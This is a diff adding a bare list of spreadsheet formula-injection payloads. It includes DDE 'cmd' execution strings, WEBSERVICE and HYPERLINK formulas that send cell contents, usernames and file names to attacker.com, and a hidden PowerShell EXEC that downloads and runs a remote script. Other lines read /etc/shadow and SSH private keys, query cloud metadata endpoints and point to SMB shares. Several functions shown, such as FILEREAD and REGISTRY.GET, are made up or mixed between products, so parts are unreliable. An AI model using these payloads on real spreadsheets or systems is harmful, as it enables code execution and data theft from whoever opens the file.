@@ -1,0 +1,130 @@
+=cmd|'/C calc'!A0
+=cmd|'/C notepad'!A0
+=cmd|'/C powershell'!A0
+=cmd|'/C whoami'!A0
+=cmd|'/C ipconfig'!A0
+=cmd|'/C net user'!A0
+=cmd|'/C systeminfo'!A0
+=cmd|'/C dir C:\'!A0
+=cmd|'/C type C:\Windows\win.ini'!A0
+=cmd|'/C echo Hacked > hacked.txt'!A0
+=cmd|'/C start cmd.exe'!A0
+=cmd|'/C start powershell.exe'!A0
+=cmd|'/C regedit /e reg.txt HKEY_CURRENT_USER'!A0
+=DDE("cmd";"/C calc";"!A0")
+=DDE("cmd";"/C notepad";"!A0")
+=DDE("cmd";"/C powershell";"!A0")
+=DDE("cmd";"/C whoami > temp.txt";"!A0")
+=DDE("cmd";"/C net localgroup administrators";"!A0")
+=DDE("Excel";"\\192.168.1.100\malicious.xls!";"'Sheet1'!A1")
+=DDE("mshta";"javascript:new ActiveXObject('WScript.Shell').Run('calc');";"!A0")
+=HYPERLINK("http://attacker.com/malicious.exe","ClickMe")
+=HYPERLINK("file:///C:/Windows/System32/drivers/etc/hosts","HostsFile")
+=HYPERLINK("file:///etc/passwd","Passwd")
+=HYPERLINK("file:///C:/Users/Public/","PublicFolder")
+=HYPERLINK("http://attacker.com/?data="&A1,"Exfil")
+=HYPERLINK(CONCATENATE("http://attacker.com/?data=",A1),"DataSteal")
+=WEBSERVICE("http://attacker.com")
+=WEBSERVICE("http://attacker.com/ping")
+=WEBSERVICE("http://attacker.com/?exfil="&A1)
+=WEBSERVICE("http://attacker.com/?exfil="&B1)
+=WEBSERVICE("http://attacker.com/?exfil="&C1)
+=WEBSERVICE("http://attacker.com/?exfil="&A1:A10)
+=WEBSERVICE("http://attacker.com/?user="&ENCODEURL(INFO("USERNAME")))
+=WEBSERVICE("http://attacker.com/?os="&INFO("OSVERSION"))
+=WEBSERVICE("http://attacker.com/?dir="&ENCODEURL(CELL("filename")))
+=WEBSERVICE("http://attacker.com/?file="&ENCODEURL(CELL("filename",A1)))
+=WEBSERVICE("http://attacker.com/?computer="&ENCODEURL(INFO("COMPUTERNAME")))
+=WEBSERVICE("http://attacker.com/?releas="&INFO("RELEASE"))
+=WEBSERVICE(CONCATENATE("http://attacker.com/?data=",A1,B1,C1))
+=WEBSERVICE(CONCATENATE("http://attacker.com/?data=",ENCODEURL(A1:B10)))
+=EXEC("calc.exe")
+=EXEC("notepad.exe")
+=EXEC("powershell.exe")
+=EXEC("cmd.exe /c whoami")
+=EXEC("cmd.exe /c ipconfig")
+=EXEC("cmd.exe /c net user")
+=EXEC("powershell -NoP -NonI -W Hidden -Exec Bypass IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/payload.ps1')")
+=EXEC("powershell Invoke-WebRequest -Uri http://attacker.com -Method POST -Body (Get-Content C:\Users\Public\passwords.txt)")
+=REGISTER("kernel32","GetProcAddress","JJCCI","GetProcAddress")
+=REGISTER("user32","MessageBoxA","JJCCI","MessageBox")
+=MSEXCEL|'\..\..\..\Windows\System32\cmd.exe'!''
+=MSEXCEL|'\..\..\..\..\Windows\System32\cmd.exe'!''
+=1+1
+=2+2
+=3*5
+=10/2
+=@SUM(1+1)*cmd|'/C calc'!A0
+="=cmd|'/C calc'!A0"
++cmd|'/C calc'!A0
+-cmd|'/C calc'!A0
+'=cmd|'/C calc'!A0
+"=cmd|'/C calc'!A0
+=1+1--cmd|'/C calc'!A0
+=2+3+cmd|'/C calc'!A0
+=IF(1=1,cmd|'/C calc'!A0,"")
+=IF(WEBSERVICE("http://attacker.com")="","",EXEC("calc.exe"))
+=CONCATENATE("http://attacker.com/?data=",ENCODEURL(A1))
+=CONCATENATE("http://attacker.com/?data=",ENCODEURL(B1:B5))
+=CONCATENATE("http://attacker.com/?data=",A1,A2,A3,A4)
+=CONCATENATE(WEBSERVICE("http://attacker.com/"),A1)
+=COM.MICROSOFT.WEBSERVICE("http://attacker.com")
+=COM.MICROSOFT.EXEC("calc.exe")
+=COM.MICROSOFT.EXEC("powershell.exe")
+=IMPORTXML("http://attacker.com","//title")
+=IMPORTDATA("http://attacker.com/data.csv")
+=IMPORTHTML("http://attacker.com","table",1)
+=IMPORTFEED("http://attacker.com/feed.xml")
+=IMPORTRANGE("http://attacker.com","Sheet1!A1")
+=GOOGLEFINANCE("http://attacker.com")
+=QUERY(IMPORTDATA("http://attacker.com"),"select *")
+=FILEREAD("C:\Windows\System32\drivers\etc\hosts")
+=FILEREAD("/etc/passwd")
+=FILEREAD("C:\Users\Public\passwords.txt")
+=FILEREAD("C:\Windows\win.ini")
+=FILEREAD("C:\boot.ini")
+=FILEREAD("C:\autoexec.bat")
+=FILEREAD("/etc/shadow")
+=FILEREAD("/etc/hosts")
+=FILEREAD("/etc/group")
+=FILEREAD("/etc/issue")
+=FILEREAD("~/.bash_history")
+=FILEREAD("~/.ssh/id_rsa")
+=REGISTRY.GET("HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProductName")
+=REGISTRY.GET("HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run")
+=REGISTRY.GET("HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\ComputerName\ComputerName")
+=ENVIRONMENT("USERNAME")
+=ENVIRONMENT("COMPUTERNAME")
+=ENVIRONMENT("USERDOMAIN")
+=ENVIRONMENT("PROCESSOR_IDENTIFIER")
+=ENVIRONMENT("NUMBER_OF_PROCESSORS")
+=GET.WINDOW(1)
+=GET.DOCUMENT(1)
+=GET.WORKBOOK(1)
+=GET.CELL(1)
+=GET.FORMULA(A1)
+=DIRECTORY()
+=FILES("C:\*.*")
+=FILES("/etc/*")
+=INFO("DIRECTORY")
+=INFO("SYSTEM")
+=INFO("MEMORY")
+=INFO("NUMFILE")
+=INFO("ORIGIN")
+=CALL("kernel32","WinExec","JJC","calc.exe",1)
+=CALL("user32","MessageBoxA","JJCCT","",0,"Hello",0)
+=RTD("mshta.exe","","javascript:new ActiveXObject('WScript.Shell').Run('calc')")
+=RTD("Excel","","cmd.exe /c calc")
+=SQL.REQUEST("Driver={SQL Server};Server=localhost;Database=master;UID=sa;PWD=password;","SELECT @@version")
+=SQL.REQUEST("DSN=localhost;UID=root;PWD=root;","SELECT user()")
+=WEBSERVICE("http://169.254.169.254/latest/meta-data/")  # AWS Metadata
+=WEBSERVICE("http://169.254.169.254/latest/user-data/")  # AWS User Data
+=WEBSERVICE("http://metadata.google.internal/computeMetadata/v1/")  # GCP Metadata
+=WEBSERVICE("http://169.254.169.254/metadata/instance?api-version=2017-08-01")  # Azure Metadata
+=HYPERLINK("file://///192.168.1.100/share","SMBHijack")
+=HYPERLINK("\\192.168.1.100\share\malicious.exe","ExecMe")
+=HYPERLINK("\\\\192.168.1.100\\share\\file","UNC")
+=HYPERLINK(CONCATENATE("http://attacker.com/?exfil=",ENCODEURL(A1:B100)),"BulkExfil")
+=HYPERLINK("http://attacker.com/?"&ENCODEURL(A1)&"="&ENCODEURL(B1),"Stolen")
+=HYPERLINK("http://attacker.com/?"&RANDBETWEEN(1,1000),"Random")
+=HYPERLINK("http://attacker.com/#"&CELL("filename"),"FileInfo")
